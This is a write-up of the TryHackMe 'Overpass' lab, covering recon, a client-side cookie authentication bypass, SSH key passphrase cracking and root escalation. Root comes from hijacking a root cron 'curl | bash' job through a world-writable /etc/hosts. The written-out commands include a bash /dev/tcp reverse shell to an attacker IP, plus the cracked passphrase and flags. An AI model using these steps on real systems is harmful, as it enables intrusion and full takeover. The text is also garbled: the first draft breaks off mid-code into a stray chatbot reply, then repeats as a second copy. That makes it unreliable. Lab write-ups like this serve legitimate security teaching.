# TryHackMe: Overpass Writeup

## Executive Summary
**Overpass** is an Easy-level Linux machine hosted on TryHackMe. The room tests fundamental web application auditing, broken authentication mechanisms, SSH private key passphrase cracking, and local privilege escalation via misconfigured scheduled tasks (`cron`) combined with weak file permissions on `/etc/hosts`.

---

## Target Information
* **Machine Name:** Overpass
* **IP Address:** `10.49.131.213`
* **OS:** Linux (Ubuntu)
* **Category:** Web Security / Linux Privilege Escalation

---

## 1. Reconnaissance & Enumeration
### Nmap Port Scan
An initial Nmap scan was performed across all TCP ports to identify running services and software versions.
```bash
nmap -sV -sC -p- 10.49.131.213 -Pn
```
- Scan Output Summary:
  - Port 22/tcp: ```OpenSSH 8.2p1 Ubuntu 4ubuntu0.13```
  - Port 80/tcp: ```Golang net/http server (Go-IPFS json-rpc or InfluxDB API)```

Web Enumeration
Visiting ```http://10.49.131.213``` in the browser displays the main landing page for Overpass, a self-proclaimed secure password manager using "Military Grade encryption."
To locate hidden directories and administrative interfaces, a directory brute-force attack was launched using ```gobuster```:
```bash
gobuster dir -u [http://10.49.131.213](http://10.49.131.213) -w /usr/share/wordlists/dirb/common.txt
```
Discovered Endpoints:
- ```/aboutus``` (Status: 301)
- ```/admin``` (Status: 301)
- ```/css``` (Status: 301)
- ```/downloads``` (Status: 301)
- ```/img``` (Status: 301)

2. Authentication Bypass & Initial Access
Source Code Analysis
Navigating to ```http://10.49.131.213/admin``` reveals an Administrator Login page. Inspecting the page source (```view-source:http://10.49.131.213/admin```) shows three imported JavaScript assets: ```main.js```, ```login.js```, and ```cookie.js```.
Analyzing ```login.js``` discloses an insecure authentication control flaw:
```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        windowHere is your complete, single `README.md` file ready to be pushed directly to your GitHub repository.

---

# TryHackMe: Overpass Writeup

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Application Security / Privilege Escalation  
**Target IP:** `10.49.131.213`  

---

## Executive Summary
The **Overpass** challenge demonstrates an attack path starting from broken client-side authentication, proceeding to SSH key cracking, and concluding with privilege escalation via local host file manipulation and automated script execution. Access was achieved by bypassing an insecure cookie check on the web login portal, retrieving an encrypted SSH key, cracking its passphrase, and taking advantage of a root-level cronjob fetching files over an unencrypted local hostname.

---

## 1. Reconnaissance & Enumeration

### Network Scanning
An initial port scan identified open services running on the host.

```bash
nmap -sV -sC -p- 10.49.131.213 -Pn
```
Discovered Services:
  - Port 22/tcp: OpenSSH 8.2p1 (Ubuntu)
  - Port 80/tcp: HTTP Web Server (Golang net/http)

Web Application Discovery
Navigating to ```[http://10.49.131.213](http://10.49.131.213)``` presented the main website promoting a password management application.
Directory brute-forcing using ```gobuster``` revealed several accessible endpoints:
```bash
gobuster dir -u http://10.49.131.213 -w /usr/share/wordlists/dirb/common.txt
```
Key Discovered Paths:
- ```/aboutus```
- ```/admin```
- ```/downloads```

2. Authentication Bypass & Initial Access
Analyzing Source Code
Visiting ```[http://10.49.131.213/admin](http://10.49.131.213/admin)``` presented an administrator login portal. Reviewing the page source code identified the JavaScript files managing session handling (```main.js, login.js, and cookie.js```).
Examining ```login.js``` revealed client-side validation logic:
```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```
Vulnerability: The client logic verifies whether the server response equals ```"Incorrect credentials"```. If any other string value or empty cookie is set, the application grants access to ```/admin```.
Cookie Injection Exploitation
By opening the browser Developer Tools console on ```/admin``` and setting an arbitrary session token, the authentication flow was bypassed:
```javascript
Cookies.set("SessionToken", "");
```
Refreshing the browser opened the restricted administrator dashboard. The panel contained a developer note alongside an encrypted RSA private SSH key belonging to user ```james```.

3. SSH Passphrase Cracking
The RSA key was saved to a local file (```paradox_rsa```). Because it was protected with a passphrase, ```ssh2john``` was used to prepare the key for offline cracking.
  1. Convert key to crackable hash:
```bash
ssh2john paradox_rsa > paradox_rsa.txt
```
  2. Run John the Ripper using the RockYou dictionary:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt paradox_rsa.txt
```
Cracked Passphrase: james13
 3. Adjust key permissions:
```bash
chmod 600 paradox_rsa
```

4. Initial Access & User Flag
An SSH session was established using the cracked private key:
```bash
ssh -i paradox_rsa james@10.49.131.213
```
After logging in, the user flag was retrieved from the user's home directory:
```bash
cat user.txt
```
User Flag: ```thm{65c1aaf000506e56996822c6281e6bf7}```

5. Privilege Escalation
Enumeration & Vulnerability Discovery
Checking ```todo.txt``` in the home directory suggested automated build scripts were running on the machine. Reviewing system-wide scheduled tasks in ```/etc/crontab``` revealed a recurring root job:
```bash
cat /etc/crontab
```
Root Cronjob Entry:
```code snippet
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
Vulnerability Analysis:
- The root account routinely downloads ```buildscript.sh``` from domain ```overpass.thm``` via HTTP and pipes it straight into ```bash```.
- Inspecting permissions on ```/etc/hosts``` showed that it was world-writable (```-rw-rw-rw-```).
- By changing the IP mapping for ```overpass.thm``` inside ```/etc/hosts```, incoming HTTP traffic can be rerouted to an attacker-controlled listener.

Host Spoofing & Reverse Shell Payload Execution
1. Redirect Domain Resolution:
Edited ```/etc/hosts``` on the target server to route ```overpass.thm``` to the local attacker IP (```192.168.130.247```).
```bash
192.168.130.247 overpass.thm
```
2. Construct Malicious Script:
On the attacker host, created directory paths matching the cron job request (```downloads/src/```) and added a reverse shell command into ```buildscript.sh```.
```bash
mkdir -p downloads/src
cd downloads/src
echo "bash -i >& /dev/tcp/192.168.130.247/4444 0>&1" > buildscript.sh
```
3. Serve Payload and Listen:
  - Stopped existing HTTP services on port 80:
```bash
service apache2 stop
```
  - Started a Python web server on port 80:
```bash
python3 -m http.server 80
```
  - Set up a Netcat listener on port 4444:
```bash
nc -lvnp 4444
```
4. Root Capture & Final Flag:
When the scheduled task executed, it retrieved the malicious script from the local web server and executed it as root, returning a reverse shell.
```bash
whoami
cd /root
cat root.txt
```
- Root Flag: ```thm{7f336f8c359dbac18d54fdd64ea753bb}```

Key Takeaways & Remediation Recommendations
1. Avoid Client-Side Authentication Enforcement: Never validate logins or check session permissions solely on the client side in JavaScript. Implement rigid backend validation for session tokens.
2. Restrict Configuration File Permissions: Ensure critical system files like ```/etc/hosts``` are strictly owned by root with write access restricted (```644```).
3. Secure Automated Tasks: Avoid piping unverified remote scripts directly to shell interpreters (```curl | bash```). Authenticate downloaded scripts using cryptographic signatures or keep resources within restricted internal paths over HTTPS.
